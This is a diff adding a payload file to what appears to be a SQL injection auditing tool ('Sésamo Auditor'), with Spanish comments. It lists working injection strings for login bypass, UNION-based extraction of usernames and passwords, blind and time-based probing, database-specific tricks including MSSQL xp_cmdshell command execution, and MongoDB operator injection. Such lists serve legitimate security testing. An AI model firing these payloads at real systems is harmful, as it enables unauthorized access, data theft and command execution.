@@ -1,0 +1,93 @@
+# ================================================================
+# Sésamo Auditor — Payloads de Inyección SQL
+# ================================================================
+# Cada línea es un payload independiente. Las líneas que empiezan
+# con '#' son comentarios y se ignoran automáticamente.
+#
+# Organizado por técnica de inyección y base de datos.
+# ================================================================
+
+# ─── Login Bypass (Autenticación) ───
+' OR 1=1 --
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+" OR "1"="1" --
+admin' --
+admin' #
+admin'/*
+') OR ('1'='1
+') OR ('1'='1' --
+' OR 1=1#
+' OR 1=1/*
+1' OR '1' = '1
+' OR ''='
+' OR 1 --
+'='
+' LIKE '%
+' OR 1=1 LIMIT 1 --
+
+# ─── Error-Based (Provocar errores de BD) ───
+'
+''
+`
+"
+'"
+;
+' AND 1=CONVERT(int, @@version) --
+' AND 1=1 --
+' AND 1=2 --
+' UNION SELECT NULL --
+') AND ('1'='1
+1' ORDER BY 1 --
+1' ORDER BY 100 --
+
+# ─── UNION-Based (Extracción de datos) ───
+' UNION SELECT NULL,NULL --
+' UNION SELECT NULL,NULL,NULL --
+' UNION SELECT 1,2,3 --
+' UNION SELECT username,password FROM users --
+' UNION ALL SELECT NULL,NULL,NULL --
+') UNION SELECT NULL,NULL --
+" UNION SELECT NULL,NULL --
+' UNION SELECT @@version,NULL --
+' UNION SELECT table_name,NULL FROM information_schema.tables --
+
+# ─── Blind Boolean-Based ───
+' AND 1=1 --
+' AND 1=2 --
+' AND SUBSTRING(@@version,1,1)='5' --
+' AND (SELECT COUNT(*) FROM users) > 0 --
+' AND ASCII(SUBSTRING((SELECT database()),1,1)) > 64 --
+
+# ─── Time-Based Blind ───
+' AND SLEEP(3) --
+' OR SLEEP(3) --
+'; WAITFOR DELAY '0:0:3' --
+' AND BENCHMARK(5000000,MD5('test')) --
+' AND pg_sleep(3) --
+
+# ─── SQLite Específicos ───
+' UNION SELECT sql FROM sqlite_master --
+' UNION SELECT name FROM sqlite_master WHERE type='table' --
+' UNION SELECT tbl_name FROM sqlite_master --
+
+# ─── MySQL Específicos ───
+' AND extractvalue(1, concat(0x7e, version())) --
+' AND updatexml(1, concat(0x7e, version()), 1) --
+
+# ─── PostgreSQL Específicos ───
+' AND 1=CAST((SELECT version()) AS int) --
+'; SELECT pg_sleep(3) --
+
+# ─── MSSQL Específicos ───
+'; EXEC xp_cmdshell('dir') --
+' AND 1=1; EXEC sp_configure --
+
+# ─── NoSQL (MongoDB) ───
+{"$gt": ""}
+{"$ne": ""}
+{"$regex": ".*"}
+' || '1'=='1
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"$where": "1==1"}
